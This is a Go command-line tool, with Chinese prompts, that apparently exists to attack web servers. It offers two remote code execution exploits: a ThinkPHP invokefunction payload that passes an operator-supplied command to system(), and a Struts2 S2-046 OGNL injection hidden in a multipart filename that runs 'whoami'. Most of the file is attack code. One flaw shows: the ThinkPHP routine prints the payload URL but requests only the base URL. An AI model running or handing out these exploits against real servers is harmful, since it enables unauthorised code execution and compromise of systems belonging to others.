package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func thinkphp()  {
	fmt.Println("Please input URL: (eg:http://x.x.x.x/)")
	var url string
	fmt.Scan(&url)
	fmt.Println("请输入想要执行的命令: ")
	var echo string
	fmt.Scan(&echo)
	url2 := string("/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=")
	url3 := url + url2 + echo
	fmt.Println("poc的URL为：",url3)

	rep , err := http.Get(url)
	if err != nil{
		fmt.Println("存在错误1：",err)
		return
	}
	defer rep.Body.Close()
	buf := make([]byte,4*1024)
	var tmp string
	for {
		n ,err2 := rep.Body.Read(buf)
		if n == 0{
			fmt.Println("存在错误2：",err2)
			break
		}
		tmp += string(buf[:n])
	}
	fmt.Println("返回为：",tmp)


}

func s2_046()  {
	fmt.Println("Please input URL: (eg:http://x.x.x.x/)")
	var url string
	fmt.Scan(&url)
	url2 := string("/doUpload.action")
	url3 := url + url2
	body := "------WebKitFormBoundaryXd004BVJN9pBYBL2\nContent-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('whoami'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}.b\"\nContent-Type: text/plain\n\nx\n------WebKitFormBoundaryXd004BVJN9pBYBL2--"


	client := &http.Client{}

	req, err := http.NewRequest("POST", url3, strings.NewReader(body))
	if err != nil {
		// handle error
	}

	req.Header.Set("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2")
	//req.Header.Set("Content-Length", "10000000")
	req.Header.Set("Transfer-Encoding","null")
	req.Header.Del("Content-Length")
	req.Header.Del("Accept-Encoding")
	req.Header.Add("Content-Length", "10000000")
	req.Header.Add("Accept-Encoding", "null")

	resp, err := client.Do(req)

	defer resp.Body.Close()

	body2, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}

	fmt.Println(string(body2))




}


func main()  {
	fmt.Println("请选择想要执行的漏洞攻击程序的序号：\n0：thinkPHP远程代码执行漏洞\n1:struts2-046漏洞\n")
	var id int
	fmt.Scan(&id)
	switch id {
	case 1:
		s2_046()
	case 0:
		thinkphp()
	default:
		fmt.Println("输入错误！！\n")
	}

}
